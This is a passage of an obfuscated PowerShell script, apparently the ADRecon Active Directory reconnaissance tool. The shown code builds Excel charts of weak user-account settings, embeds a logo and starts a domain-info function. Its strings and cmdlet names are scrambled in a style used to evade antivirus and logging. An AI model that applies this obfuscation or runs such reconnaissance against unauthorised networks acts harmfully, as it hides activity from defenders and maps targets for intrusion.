            ${O`BjattRiBu`Tes}.("{0}{1}"-f 'Ad','d').Invoke(("{3}{2}{0}{4}{1}" -f' Nev','es','rd','Passwo','er Expir'),((("{3}{0}{2}{1}" -f'TRUEG','P','4','G4P'))."r`EPLa`Ce"(([cHAR]71+[cHAR]52+[cHAR]80),[stRiNg][cHAR]34)))
            ${oB`J`Att`Ri`BuTeS}.("{1}{0}"-f'd','Ad').Invoke(("{3}{5}{1}{4}{0}{2}"-f'Enc','ble ','ryption','Rev','Password ','ersi'),((("{2}{1}{0}" -f 'E{0}','0}TRU','{')) -f  [ChaR]34))
            ${Ob`j`AttR`iButes}.("{0}{1}"-f 'A','dd').Invoke(("{1}{0}{4}{2}{7}{3}{6}{5}" -f 'a','Smartc','Log','equ','rd ','ed','ir','on R'),((("{2}{0}{1}" -f '2TT','RUEn2T','n'))."ReplA`ce"(([CHar]110+[CHar]50+[CHar]84),[STrIng][CHar]34)))
            ${objAttRi`B`U`TES}.("{1}{0}"-f'd','Ad').Invoke(("{0}{1}{2}{3}" -f 'Delegati','on Pe','rm','itted'),((("{1}{0}" -f 'HTRUENEH','NE'))."Re`PLACe"(([chAR]78+[chAR]69+[chAR]72),[stRINg][chAR]34)))
            ${obJa`TTribU`T`Es}.("{0}{1}"-f 'Ad','d').Invoke(("{1}{2}{0}{3}"-f 'ES Onl','Kerb','eros D','y'),((("{2}{0}{3}{1}"-f'}TRUE','0}','{0','{'))  -F [cHaR]34))
            ${OBJAt`Tri`BUT`Es}.("{0}{1}"-f'Ad','d').Invoke(("{0}{2}{1}{3}" -f'Ker','os R','ber','C4'),((("{0}{3}{1}{2}"-f '{','{','0}','0}TRUE'))-f [CHaR]34))
            ${ob`jAT`T`RiBuTes}.("{0}{1}" -f 'Ad','d').Invoke(("{3}{4}{1}{0}{5}{2}{6}"-f'Requi',' Not ',' Pre','D','oes','re',' Auth'),((("{0}{2}{1}{3}" -f'oi','E','YTRU','oiY'))."RE`pla`ce"(([ChAR]111+[ChAR]105+[ChAR]89),[stRinG][ChAR]34)))
            ${obJ`ATTRI`B`U`TEs}.("{1}{0}"-f'dd','A').Invoke(((("{2}{0}{4}{1}{3}" -f 'ssword A','e','Pa',' (> ','g'))),((("{0}{1}{2}" -f'tR','XTRUE','tRX'))-rEPlaCE  'tRX',[ChAR]34))
            ${oBj`AtTri`BUT`Es}.("{0}{1}"-f 'Ad','d').Invoke(("{4}{1}{3}{2}{0}" -f 'Out','nt ','d ','Locke','Accou'),((("{2}{0}{1}"-f '}TRUE','{0}','{0')) -F[char]34))
            ${ob`jAtTRi`Bu`Tes}.("{1}{0}" -f'dd','A').Invoke(("{2}{0}{1}" -f 'r Logged ','in','Neve'),((("{2}{1}{0}"-f 'inz','zTRUE','in'))."r`E`PLAce"('inz',[STRinG][ChaR]34)))
            ${Ob`J`AtTRi`BU`Tes}.("{0}{1}" -f'Ad','d').Invoke(("{2}{1}{0}" -f 'ant','rm','Do'),((("{1}{0}{2}"-f'13TR','s','UEs13'))."r`EpLa`CE"('s13',[STrinG][ChAR]34)))
            ${oB`j`ATTr`IBU`TES}.("{1}{0}"-f 'd','Ad').Invoke(("{2}{1}{0}{3}" -f't Requir','ord No','Passw','ed'),((("{1}{0}"-f 'tFD','tFDTRUE'))  -CRePLacE ([CHaR]116+[CHaR]70+[CHaR]68),[CHaR]34))
            ${OB`jAtTrIbU`T`ES}.("{1}{0}" -f 'dd','A').Invoke(("{0}{4}{2}{1}{3}"-f'Del',' ','gation','Typ','e'),((("{4}{3}{0}{2}{1}{6}{5}"-f 'n','tr','cons','U','jbp','p','ainedjb'))."REp`la`Ce"(([CHAR]106+[CHAR]98+[CHAR]112),[strInG][CHAR]34)))
            ${obJAt`TR`i`ButES}.("{0}{1}"-f 'Ad','d').Invoke(("{1}{0}{2}"-f'Hist','SID','ory'),'"*"')

            &("{0}{1}{4}{3}{2}"-f 'Get','-ADRE','ts','eSta','xcelAttribut') -SrcSheetName ("{0}{1}"-f'U','sers') -Title1 ("{2}{4}{0}{1}{3}" -f'n','ts i','Us','n AD','er Accou') -PivotTableName ("{0}{3}{2}{1}"-f'User Accou','s','atu','nts St') -PivotRows ("{0}{2}{1}"-f'E','abled','n') -PivotValues ("{1}{0}{2}" -f 'Na','User','me') -PivotPercentage ("{1}{0}"-f'ame','UserN') -Title2 ("{0}{1}{3}{2}{4}"-f 'S','tatus of Us','ccount','er A','s') -ObjAttributes ${Obj`At`T`R`ibutes}
            &("{0}{1}{2}"-f'Remove-V','aria','ble') ("{2}{1}{0}{3}"-f'ibut','r','ObjAtt','es')

            &("{2}{0}{3}{4}{1}"-f 'A','hart','Get-','DRE','xcelC') -ChartType ("{1}{0}" -f 'Pie','xl') -ChartLayout 3 -ChartTitle ("{2}{4}{1}{0}{3}"-f' ','nts','User A','in AD','ccou') -RangetoCover ("{1}{0}" -f'D33','A21:') -ChartData ${WOrkB`oOK}."wORksh`Ee`TS".("{0}{1}"-f 'Ite','m').Invoke(1).("{1}{0}"-f'ange','R').Invoke(("{1}{2}{0}" -f '4','A3:A','4,B3:B'))
            ${W`ORK`BoOk}."WO`Rk`SHEEts".("{0}{1}" -f 'It','em').Invoke(1)."H`yPER`lInkS".("{0}{1}"-f 'A','dd').Invoke(${WOR`Kb`O`OK}."work`S`Heets".("{0}{1}"-f 'Ite','m').Invoke(1)."Ce`LlS".("{0}{1}"-f'Ite','m').Invoke(20,1) , "" , ("{2}{0}{1}"-f 'ers','!A1','Us'), "", ("{0}{2}{1}"-f'Ra','ata','w D')) | &("{2}{1}{0}" -f 'l','l','Out-Nu')

            &("{4}{3}{2}{1}{0}" -f 'hart','ExcelC','ADR','t-','Ge') -ChartType ("{1}{2}{0}{3}"-f'rCl','x','lBa','ustered') -ChartLayout 1 -ChartTitle ("{3}{4}{0}{1}{2}{5}"-f'User ','A','ccount','S','tatus of ','s') -RangetoCover ("{0}{2}{1}"-f 'F2',':L43','1') -ChartData ${wOrkbo`Ok}."WOr`kshe`E`TS".("{0}{1}" -f'I','tem').Invoke(1).("{0}{1}"-f'Rang','e').Invoke(("{2}{1}{0}"-f',G2:G18','18','F2:F'))
            ${W`oRK`BOOk}."WorK`S`hEEts".("{1}{0}" -f'em','It').Invoke(1)."h`Yp`ErLi`NKs".("{0}{1}" -f 'A','dd').Invoke(${w`oRk`BO`OK}."woRK`sheE`TS".("{1}{0}"-f'm','Ite').Invoke(1)."CeL`lS".("{1}{0}" -f'em','It').Invoke(20,6) , "" , ("{0}{1}{2}"-f'Use','r','s!A1'), "", ("{0}{2}{1}"-f'Ra',' Data','w')) | &("{0}{1}"-f'Out-N','ull')

            ${wOrk`Book}."wORks`He`etS".("{0}{1}"-f 'Ite','m').Invoke(1)."USeDRaN`gE"."enTi`RE`CoL`Umn".("{2}{0}{1}" -f'ut','oFit','A').Invoke() | &("{1}{0}{2}" -f'ut','O','-Null')
            ${e`XC`EL}."wiN`Do`wS".("{1}{0}"-f 'm','Ite').Invoke(1)."DISpLa`yGRi`dLI`N`eS" = ${fA`lsE}
        }

        
        &("{3}{1}{0}{2}" -f'b','celWork','ook','Get-ADREx') -Name ("{1}{0}{4}{3}{2}"-f 'f Co','Table o','ts','ten','n')
        ${w`o`RKSh`eeT} = ${wORkb`O`oK}."w`orkShe`eTS".("{0}{1}"-f 'I','tem').Invoke(1)

        ${eX`cel}."Sc`Ree`Nu`p`DATInG" = ${f`Al`se}
        
        
        

		${base6`4`ADREc`ON} = ("{116}{30}{40}{67}{91}{118}{14}{90}{27}{52}{13}{48}{6}{74}{49}{125}{43}{117}{115}{103}{101}{62}{12}{106}{107}{113}{64}{20}{47}{22}{78}{56}{19}{61}{29}{120}{39}{41}{127}{4}{26}{8}{16}{94}{65}{1}{85}{92}{79}{44}{81}{58}{0}{51}{114}{25}{123}{55}{18}{34}{7}{17}{124}{95}{97}{66}{100}{2}{96}{70}{108}{76}{73}{111}{69}{28}{11}{72}{122}{10}{23}{37}{109}{21}{42}{45}{80}{15}{57}{33}{75}{88}{104}{105}{86}{31}{3}{89}{121}{82}{63}{98}{46}{119}{35}{60}{36}{110}{50}{99}{54}{83}{9}{112}{68}{126}{32}{59}{102}{93}{71}{5}{87}{84}{24}{38}{77}{53}"-f 'S4ltZtqudsnjvp9hvVcn','De2qO+2aLHcO2x','cH9ntHtEwAipxHFqt4ySkDzd1/t+TX/aLjkWClFD1Hg1lKgRiODGKFEV1oGkm71p+0GqW2mMsnkkGropJB+LGKFE','wD/AP8A/8QAMxEBAQEAAwABAgUFAQEAAQEJAQARITEQQVFhIHHwkYGhsdHB4fEwQFBgcICQoLDA0OD/2gA','qgeYbdbzW2TafWaxH84lRtc2+9ZJjp5Fry8deGn12oVvOJV2jpxMdh2CN5BF9Q6LPWcn63m3LWtzY4bedXiFuvm/W8l32ubDq+E7nJw1WZVx/rPk3rDqO08uCjX3UeW+pkeYAIHfO27PjOy','wmH9WA3zL5krx5v/ANb/','AAAAgZ1RSQwAAAiwAAAAgYlRSQwAAAkwAAAAg','/gf','u+8842il6','rrKRCYXNJaEnALJVOBE9euaWIJ4PO9VeYEik9qQAcjflf/AKupa5p//SyEks4/4Lp/Yq3RKOZ4oMQ6/ujHkY','Bygj8rzNkKfNBoEFJFi','R6mFLXHkRrq/','idFN2WzV','UAAAABOd3RwdAAAAZAAAAAUY2hhZAAAAaQAAAAsclhZWgAAAdAAAAAUYlhZWgAAAeQAAAAUZ1hZ','AAAAAAAAAAAAAAAAAAA','PgBJ/F4dw9tlxp0b+9/a/tv5/58ljTr1c2lCENUOdUKYEHmNb9Hg4+v8AiRzqhxCj9n/g/dayb+zX+U8/','DmsR03MTqjbFdtq22rbattq22rbattq22rbattq22rbattq22r/2gAIAQEAAQUC/wB/o','bmR5cgrGhl/EDk/CW','6IlRtBpJv9g//aAAgBAhEBP','S1tre4ubrAwsPExcbHyMnK0NPU1dbX2Nna4OLj5OXm5+jp6vLz9PX29/j5+v/bAEMABQMEBAQDBQQEBAUFBQYHDAgHBwcHDwsLCQwRDx','Dk5ebn6Onq8/T19vf4+fr/xAAfAQADAQEBAQEBAQEBAAAAAAABAgADBAUGBwgJCgv/xADDEQACAgEDAwMCAwUCBQIEBIcBAAIRAxASIQQgMUETBTAiMlEUQA','SaEVf1wO+X2Dt/fd9X2Boc4s/9D4HIJnurZYZPTKL52bJlJYoh7v7f+f/AMHufCD+rAxmaP6lIXmKqus1UhsJfi','QJJGhQ7EWB2I1U/DRJWDBROFy8ReCYzZwJkVUkiei0ggJChgZGigpKj','5IKcT+aDEI','w','y6sr9HJ8','y0856zketdVdXynU46c4HlundF8d2PHsHnZcDmEummZfVLzw/Ya+vcNzWZd6P5xnUvWcdqu0U+r1xXkGze8RT7RPXFeQbN+h6bznMPXmHmGU','AAAAAAAAAAAAAAAAAAA','drhE8yUFXCrWR+00Wd/L/FKcC1CyoYaaUZRDJih','yI','SkZJRgABAQAASABIAAD/4QBMRXhpZgAATU0AKgAAAAgAAgE','KgvfeTw8W/lljjYE0YOWwgCijjT9T9yxgAg/wD/AP8A/wD/AP8A/wD/AP8A/','FtwBcE8ji81AkZB9ySk2hBPIWfi/8A0P8Aus','CCwfJ4qyYPPLX50pb0xh','wH9gEz+L83ICZgO04+XLL7LDs2i7Yy+2y+/HT34pmALRniykIi05ohBsW5pbY2Emo/hQblFyn7XJ/CRd1Nz','grUPGBeRPqi9cvQc40E7gNJ4rfuw+P+/i56/5H/IfH','oORd/T7pZHf','AJ/F9SyEUGgQUkWLkgpxP5v+L/dUHiE','ehckJV1nQIw4uzs63j','RQeHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eH','SAAMAAAABAAEAAIdp','h4eHh4eHh4eHh4eHv/aAA','kYEjw004pmkDM','AAYgB1AG','f8Q2bePdL7eNunUH4J/','oycNP2EPd/wDoXyDHO35E8Z3/AMEkjRPmgI','QjmPVVURhgv/ANb/AKs7xo','YzI2FCFXFSNIF','WgAAAfgAAAAUclRSQwAAAgw','GVuVVMAAAA','FVg5KxHjGtB6HAXZjitVaI','wy903CVXbwpe2ttZTGsu1bgZl72LRN/t9/c2jT','AAAAAAAAAAAAAAAAAAAAALZGVzYwAAAQgAAAA4Y3BydAAAA','/APT/AP/Z','z/wAPa0gcVkonC','T8B/YDEeGPEbbEmA+6ndfFJHL7ZafaLt5fbKIkmkYyUhxi5IHPlIqJYeWJ+9NV9ri/E74sDc22P4Cw/Ex/Gg3Jn+JEq091M7YypEqdz7jufcROn3P','Gh4iJipCTlJWWl5iZmqCjpKWmp6ipqrCys7','8/SX9r/P/wCE3Sf5Tz/+C3','N3ut7DYqJqb','W0BlGPd/f/AMqPT7uNWPd/x/u/7X','/Iv+b/8Ag/fxf8X4f8Mf4rz/AMDw8HXTEcFl','ISEQ8RERMWHBcTFBoVEREYIRgaHR0fHx8TF','AADAAAAAmZmAADypwAADVkAABPQAAAKW3BhcmEAAAAAAAMAAAACZmYAAPKnAAANWQAAE9AAAApbcGFyYQAAAAAAAwAAAAJmZgAA8qcAAA1ZAAAT0AAACltjaHJtAAAAAAADAAAAAKPXAABUewAATM0AAJmaAAAmZgAAD1z/wgARCABGAOoDASIAAhEBAxEB/8QAHwAAAQUBAQEBAQEAAAAAAAAAAwIEAQUABgcICQoL/8QAwxAAAQMDAgQDBAYEBwYECAZzAQIAAxEEEiEFMRMiEAZBUTIUYXEjB4EgkUIVoVIzsSRiMBbBctFDkjSCCOFTQCVjFzXwk3OiUESyg/EmVDZklHTCYNKEoxhw4','4yP2mI2Bl8r6QDitJflIwPi/oItnX0sIjA4It+rv5w7GHJgfOlfDgfOlfDiA3k+bB5TfGUf5OwB8f/gf/9oACAEBAAE/EP8A9P6uHO','jZ2u','GQdxtNomtbmCW3l/1FD+98Zf7Sty/wCMP2f/AGp+O/8AGntV5Juad9s0WO4eCv8AafP+/wDCqVI3bxYpKt5hiXIpHh7bCjd9ksreyUlSTDEuRSPD22FH9Hdre82kVruGxbTb3cX9Hdre77JZW9kpKknw9tMO4W2zbXFc3af','fN2v8At+Tj+Q','AAQAAAABAAAAJgAAAAAAAqACAAQAAAABAAAA6qADAAQAAAABAAA','hEfxRFkg85NSPikLWeSGF48lkBc8GHOx7v+xV/Jf8AgEz/AB58uqnveZDnKiJFEfDKtIjTK5','+z2j+Ra/7Id18/wCpr/tFx/Itf9kdo+d+7y6mI9nlAjWOujJPmxLCrFY82i73CVPvYPEtKriaNRTw1ftx/i5LOKWtqD0D4','96DVLbTGWT','U','bj/FqFlQw0FKMohkxQo9TClrjyI11ftx/i89uUME6','Ecs09tw25XnRQNXB/Z7R/Itf9kO5T6lqV70NT6M7VyuqPpz7XI/lMq984lpnVcCQDya/7Id1p5/1NfUfaL9ou3r+24MdOl+0fxcdddGv+yHcn0P9TEKYeXgrj6uPXyLX/ZHe5J4ZMg2+oOvQ0xW0OMnkcXF/kuD+x2j3W4pyKeXFqnhriR5u6+f9TnVeSyKQdA5N0GPIkNRrr2uvn/U1/wAYk9o+b/xmT8','Y2hybQAAAmwAAAAkbWx1YwAAAAAAAAABAAAAD','XcHk8cU','XNJIpQKOFHLHdFUSE8CdHRN0Sfgpqt4ySkDz7rnEuHKPBothEU8o8fVx7O','s1Q4djQ/j1YTeP6sSkz/VVFL/fN/vn/vcwXuYokcFH/oxZs13/ALNd/wCrNn0ZxSPBZ2Xfn/8AAv1Zs+j','c4OTpGR0hJSlVWV1hZWmRlZmdoaWpzdHV2d3h5eoCDhIW','942ML2vctquLzd/wDjLvHf+NPZ7OXbTv8AdxXu4+C','SKSSTrTLm8yppKfM//AIO','xCa9u+d79eOSRcqvBX+0+f9+9n/wBqfjv/ABp+Ev8Aa34v/wBrXgr/AGnz/v8Awl/tb8X/AO1p2XK','/9oACAECEQE/EP8A7rwzk+pkCXCwYdPmR35LwpbQUI5KBt8GP7WoSHObUOp2Mh8yLHUIy2z8kAhghPyjinHx976E','uMUypAY/FHmQQOT192AsGoHUfx/w7q8Dr/RcwB8fzUGQdb7sQxlJsSzHFm/OECZlizBl7','/8A1v8Aqr0','7Sb+Pft2F9BZ3v6UsxZGw8QeO/8afhL/a14v/2teBxlZSeFFqXuu5BFk/BCQqyX4WlUvad','QMRAAAQ7zzzzzzz/wD/APP/AD/wKnmaoBooI','AKsblVUay79Ua2pCiMvHu','y6Qun/EL4Dj/wAKobHbKCiR','IAQMRAT8Qsss/+gc3K+g2YqNujmNntBcY4JE21uQkNwSJtkl0UopDkyNYE+seLEtlyjlvqQLuXISvrdiTi4OcZYrBhDkYMyzYGSPSZbPLTi/KSt04vylo64+khMj01aW7','AAAAPbWAAEAAAAA0y1sY21zAAAAAAAAAAAAAAAAAAAAAAA','ARgAAAAD/7QA4UGhvdG9zaG9wIDMuMAA4QklNBAQAAAAAAAA4QklNBCUAAAAAABDUHYzZjwCyBOmACZjs+EJ+/+ICoElDQ19QUk9GSUxFAAEBAAACkGxjbXMEMAAAbW50clJHQiBYWVogB+IAAwAbAAUANwAOYWNzcEFQUEwAAA','gXZXvi7/a14LA9wnUrn5Ke0a7p456brJT8J6714v/ANrXgc0svEG8JvkeEyf014v/ANrXbwPQWS','6J4A1B50VbxhwHPqtRLE8rzYCoSCYHmsyslwhDgfdXi1yILMcX/AOt/1RwRw5Di9XZ0Xbx5ZPxQ7mpQN4IjjiiVjpSTs/1XCJophMP6sBvmXzJXjzf/AK3/AFRKxk5J2f6rhE0','1O0bfFDJuVhLGvbY0y393t+w2quT4Ze5WEsa34U2+0vLYwe','JQ6CpyXEUJ91r0K8qOGNYq','V1oGkm71p+0H/jn+9BmC3VzE0+bkVeLVCQdK6P/HP','lStWE3ATGTwqX7cf4uSeKE+616FeVO0y7mPLEuhXH+LKNsxXc+QHF8uZBQr0P+o0','f3U76uX7rzzUI/5neXPN54/wCH/wChCDKAHlqdxZ8nuR6rm8UORxF9','pDT7f8AHNEibhMhqaRA7wmOQRP/ABwNxwweWEviqi81iPGNihoDyNN3jEgxETAeqIQ5R0x6mlAV8ss','dv/b','DkFhZWiAAAAAAAAAknQAAD4MAALa+WFlaIAAAAAAAAGKlAAC3kAAAGN5wYXJhAAAAA','ld82P+B1e8d380Cvt/K/4byv8AgPV/xfuwe','JRYWVogAAAAAAAAb5QAADjuAAA','SfmkbjB4qoMBQeFqHm7wA93/ABCg0APC1Dzd4Ae7/iMIEaEN6lrDn/E','JbEGpyv5QQ0qls9soOJFp+aJwqaM+BH/6+P/aAAwDAQACE','XWklcOF8tNGdoDjR1ZmtAkKGRooKSo4OTpI','SUpXWFl','ySDV0UCD8','R0/VjguHOfd/xf7qDEIAJ/F9','aZmifl/yvg/8A2XlD2XXGsrKPCQMa0rQehwF2fFaq0RSGn2pbjhg8sJf','XlIoqPqXdf7fk1/wBo9rf+27f','eQVRnWAiEnVNXKRJ4vgB6/n/','aZ2hpand4eXqGh4iJipCWl5iZmqClpqeoqaqwtba3uLm6wMTFxsfIycrQ1NXW19','H4bUnk+GXvYtE3+339zaNMfhtSeT4Ze6qt4N02','pAGcAaAB0ACwAIAB1AHMAZQAgAGYAcgBlAGUAbAB5AAAAAFhZWiAAAAAAAAD21gABAAAAANMtc2YzMgAAAAAAAQxKAAAF4///8yoAAAebAAD9h///+6L///2jAAAD2AAAw','/9j/4AAQ','kAbAB0AC0AaQBuAABtbHVjAAAAAAAAAAEAAAAMZW5VUwAAADIAAAAcAE4AbwAgAGMAbwBwAHkAcgB','AAAAAAAA','Qo4je71Tziph','kIh4kHB4fHv/bAEMBBQUFBwYHDggIDh4UE','f/wP','pIalbzKkrSaIq/bj/FmfbJEC5HCj50ysl+ruETypQVcKtZHq0STLCE04lqkhWFooNR/v+//xAAzEAEAAwACAgICAgMBAQAAAgsBEQAhMUFRYXGBkaGxwfDREOHxIDBAUGBwgJCgsMDQ4P/aAAgBAQABPyH/APXoQHLfFhkC0kH51UGYQeaOGZHJ/wAQTSvdf8TyMYzwVkAjDRDKZfoqYxJf/wBDP0v8390/hf8AP+7+mv7f+f8An4VPrihzizyv7Nf5Tze','Mu/k2mzt7u4lupvCl7a21lMay+GporfdfE08Vxuv8Av9//2gAIAQMRA','f8IMogQcf4AmFm2k4ObtjjpnHcKZRsO3ii+z/V28UX2f6px2EYf6soCQpIsUxG0V+wf/2gAIAQEABj8C/wB/tGpe7x8u','cAAAAHABzAFIARwBCAC','o+Gz','wDAQACEQMRAAAB8w2n2fNjTqjTqjTqjTqjTqjTqjTqjbVttW21bTqjbVtOqNtWnFj2dP3RuXfy/wBc8p7JltuB5/0A3n/ovL93R63zj')

        ${B`ytEs} =   (  GEt-ITEm  ('v'+'ARIabLE:'+'F'+'4e')  ).VALuE::("{3}{0}{1}{4}{2}{5}"-f 'r','omBa','tr','F','se64S','ing').Invoke(${BAse64A`d`Re`c`On})
        &("{3}{0}{2}{1}" -f 'em','Variable','ove-','R') ("{1}{2}{0}{4}{3}" -f 'r','b','ase64ad','con','e')

        ${cOMpA`NY`lO`Go} = -join(${rEpo`R`Tp`ATH},'\',("{2}{1}{0}{3}" -f'Logo.j','_','ADRecon','pg'))
		${P} = &("{2}{1}{0}"-f '-Object','w','Ne') ("{2}{1}{3}{0}" -f'am','.Memor','IO','yStre')(${Byt`es}, 0, ${b`yteS}."lE`NgtH")
		${p}.("{0}{1}"-f'Writ','e').Invoke(${ByT`es}, 0, ${By`T`ES}."l`enG`TH")
        &("{1}{0}" -f 'pe','Add-Ty') -AssemblyName ("{0}{1}{3}{2}" -f'Syst','em','ing','.Draw')
		${PIc`TuRe} =   ( vARIaBLE I0PbhV -vAlUEON  )::("{1}{2}{0}"-f'tream','Fro','mS').Invoke(${p}, ${tr`UE})
		${Pi`c`TuRE}.("{1}{0}" -f'e','Sav').Invoke(${co`mPa`NYlOGo})

        &("{1}{3}{0}{2}"-f 'e-Variabl','Re','e','mov') ("{0}{1}"-f 'by','tes')
        &("{3}{2}{4}{1}{0}"-f'able','i','e','Remov','-Var') ('p')
        &("{0}{2}{1}{3}" -f'Rem','-V','ove','ariable') ("{1}{0}" -f'ure','pict')

        ${LinKto`F`IlE} = ${FAL`SE}
        ${S`Av`EWitHdo`C`U`mEnT} = ${tr`UE}
        ${l`EFt} = 0
        ${t`Op} = 0
        ${W`IDTH} = 150
        ${hE`IGht} = 50

        
        ${WOrks`h`EEt}."ShaP`ES".("{2}{0}{3}{1}"-f 'dPic','ure','Ad','t').Invoke(${COM`Pa`NYl`OGO}, ${LinKto`FI`Le}, ${sA`VE`W`ItHd`OcUmEnt}, ${le`FT}, ${t`OP}, ${W`i`DTh}, ${Hei`gHT}) | &("{1}{0}{2}"-f 'u','O','t-Null')

        &("{0}{1}{2}"-f 'Re','move-','Variable') ("{3}{0}{2}{1}"-f 'i','oFile','nkT','L')
        &("{3}{2}{1}{0}"-f 'iable','Var','e-','Remov') ("{3}{0}{1}{2}" -f 'WithDocu','me','nt','Save')
        &("{4}{0}{3}{1}{2}"-f 've','ia','ble','-Var','Remo') ("{0}{1}" -f 'Le','ft')
        &("{2}{1}{0}" -f 'able','move-Vari','Re') ("{1}{0}" -f 'p','To')
        &("{1}{2}{0}"-f 've-Variable','Rem','o') ("{0}{1}"-f 'Widt','h')
        &("{2}{0}{1}"-f 'Variabl','e','Remove-') ("{0}{1}"-f 'H','eight')

        If (&("{0}{2}{1}"-f'T','t-Path','es') -Path ${cOM`Pa`NYl`ogO})
        {
            &("{0}{3}{2}{1}" -f'Remove','em','It','-') ${COm`PA`NYLOgo}
        }
        &("{0}{2}{1}" -f'Re','riable','move-Va') ("{2}{1}{0}"-f 'Logo','any','Comp')

        ${r`ow} = 5
        ${col`U`mN} = 1
        ${Wor`kSH`eET}."cE`Lls".("{0}{1}" -f 'Ite','m').Invoke(${r`oW},${coL`Umn})= ("{1}{4}{2}{3}{0}"-f's','Table ','Con','tent','of ')
        ${Works`h`EET}."cEL`lS".("{0}{1}"-f'Ite','m').Invoke(${r`Ow},${coL`U`mn})."sT`YLE" = ("{0}{2}{1}" -f 'Headi','2','ng ')
        ${r`oW}++

        For(${i}=2; ${I} -le ${wor`kB`oOk}."wO`RK`sHEeTS"."cou`Nt"; ${i}++)
        {
            ${Wo`RkBo`oK}."wO`RK`sheets".("{1}{0}" -f'em','It').Invoke(1)."hyP`Er`LiNKS".("{1}{0}"-f 'dd','A').Invoke(${WORk`Bo`OK}."w`ORKs`hEETS".("{1}{0}" -f'em','It').Invoke(1)."c`EllS".("{0}{1}" -f'It','em').Invoke(${R`Ow},${col`Umn}) , "" , "'$($workbook.Worksheets.Item($i).Name)'!A1", "", ${WOrkB`O`OK}."wO`RkshE`ets".("{0}{1}" -f'I','tem').Invoke(${I})."Na`me") | &("{2}{1}{0}" -f 'l','-Nul','Out')
            ${R`ow}++
        }

        ${r`oW}++
		${WO`Rk`B`oOk}."wO`RKS`HeETs".("{0}{1}"-f 'It','em').Invoke(1)."HYpe`R`LI`NkS".("{1}{0}" -f 'd','Ad').Invoke(${w`oRkbo`Ok}."WorK`Shee`TS".("{1}{0}" -f 'tem','I').Invoke(1)."cel`ls".("{1}{0}" -f'em','It').Invoke(${r`OW},1) , ("{6}{3}{1}{2}{4}{5}{0}" -f'econ','hub','.com/adrecon/','//git','A','DR','https:'), "" , "", ("{0}{3}{6}{5}{4}{2}{1}"-f 'github.','on','Rec','c','AD','m/adrecon/','o')) | &("{1}{2}{0}"-f 'l','Out-','Nul')

        ${WO`R`ksHEet}."USedR`AN`Ge"."e`NTiRECOLU`MN".("{0}{1}"-f 'Au','toFit').Invoke() | &("{0}{2}{1}"-f 'Out-','ll','Nu')

        ${e`x`CEL}."wI`NDo`WS".("{1}{0}" -f'm','Ite').Invoke(1)."d`iSp`laygR`idLI`NEs" = ${fa`Lse}
        ${ex`cel}."s`c`REE`NuP`DaTinG" = ${T`Rue}
        ${ADSta`TF`i`leName} = -join(${eX`celpa`TH},'\',${D`o`MaIn`NaMe},("{2}{3}{4}{0}{1}" -f 'port.xl','sx','ADReco','n-R','e'))
        Try
        {
            
            ${eXc`eL}."DiS`pLAYA`lER`Ts" = ${F`AlSE}
            ${W`ORK`B`oOk}.("{1}{0}"-f 'aveAs','S').Invoke(${ADstATfi`leN`A`ME})
            &("{0}{1}{2}"-f'W','r','ite-Output') ('['+'+] '+'Excel'+'sh'+'eet '+'Sa'+'ved '+'t'+'o: '+"$ADStatFileName")
        }
        Catch
        {
            &("{1}{3}{0}{2}" -f'-Er','Wr','ror','ite') "[EXCEPTION] $($_.Exception.Message) "
        }
        ${exC`eL}.("{0}{1}"-f'Qui','t').Invoke()
        &("{0}{2}{4}{5}{3}{1}" -f'Get-ADRE','ease','xcel','l','ComObjR','e') -ComObjtoRelease ${W`o`RkSheeT} -Final ${tR`Ue}
        &("{0}{3}{1}{2}{4}"-f 'Remo','-Variab','l','ve','e') ("{2}{3}{1}{0}"-f 'heet','s','wor','k')
        &("{0}{4}{3}{2}{5}{1}"-f'Get','ObjRelease','celC','Ex','-ADR','om') -ComObjtoRelease ${WORk`B`OoK} -Final ${TR`UE}
        &("{1}{0}{2}"-f 'mov','Re','e-Variable') -Name ("{2}{0}{1}"-f 'oo','k','workb') -Scope ("{1}{0}{2}"-f 'a','Glob','l')
        &("{1}{2}{4}{3}{0}" -f'se','Get-ADRExc','elComOb','a','jRele') -ComObjtoRelease ${exC`El} -Final ${T`RUe}
        &("{1}{0}{3}{2}"-f 'move-Varia','Re','e','bl') -Name ("{1}{0}"-f'l','exce') -Scope ("{0}{2}{1}" -f 'Glob','l','a')
    }
}

Function GET-adRdO`M`A`IN
{

    param(
        [Parameter(MANdATORy = ${t`Rue})]
        [string] ${MET`H`Od},

        [Parameter(MAndATory = ${FA`LSe})]
        [DirectoryServices.DirectoryEntry] ${oB`jDOmA`iN},

        [Parameter(mAndatORY = ${f`Al`SE})]
        [DirectoryServices.DirectoryEntry] ${OB`jDOM`AInRo`OtdSE},

        [Parameter(maNdatoRY = ${f`ALse})]
        [string] ${doMA`I`NConTr`OlleR},

        [Parameter(mAnDATory = ${FA`LSE})]
        [Management.Automation.PSCredential] ${c`Red`en`TIAL} =   $Nk5P::"EM`ptY"
    )

    If (${mE`T`hoD} -eq ("{1}{0}" -f 'S','ADW'))
    {
        Try
        {
            ${ADD`oma`in} = &("{0}{2}{1}" -f'Get-','in','ADDoma')
        }
        Catch
        {
            &("{1}{2}{3}{0}"-f'ng','Write-','Warn','i') ("{4}{5}{8}{0}{6}{3}{7}{2}{1}" -f 'ett','t','ontex','g Dom','[Get','-ADRDomain] Error ','in','ain C','g')
            &("{3}{0}{2}{1}" -f'e-','e','Verbos','Writ') "[EXCEPTION] $($_.Exception.Message) "
            Return ${N`ULL}
        }
        If (${a`dDoM`AiN})
        {
            ${dom`A`ino`Bj} = @()

            
            ${fL`AD} = @{
	            0 = ("{0}{2}{1}"-f'Windo','0','ws200');
	            1 = ("{3}{2}{4}{1}{0}"-f 'Interim','003/','dows','Win','2');
	            2 = ("{2}{0}{1}{3}"-f 'n','dows','Wi','2003');
	            3 = ("{2}{1}{0}"-f 's2008','indow','W');
	            4 = ("{3}{1}{2}{0}"-f '008R2','dow','s2','Win');
	            5 = ("{0}{1}{2}" -f 'Window','s20','12');
	            6 = ("{3}{0}{2}{1}"-f'dows201','2','2R','Win');
	            7 = ("{3}{2}{0}{1}" -f'dows2','016','in','W')
            }
            ${DO`ma`iNmODE} = ${F`lAd}[ (geT-VARiABle ("0"+"52"+"8Hs") -ValU)::("{0}{1}" -f'ToIn','t32').Invoke(${addO`maiN}."DOM`A`inMO`dE")] + ("{1}{0}{2}" -f'om','D','ain')
            &("{1}{0}{3}{2}"-f'-Va','Remove','ble','ria') ("{0}{1}"-f 'FL','AD')
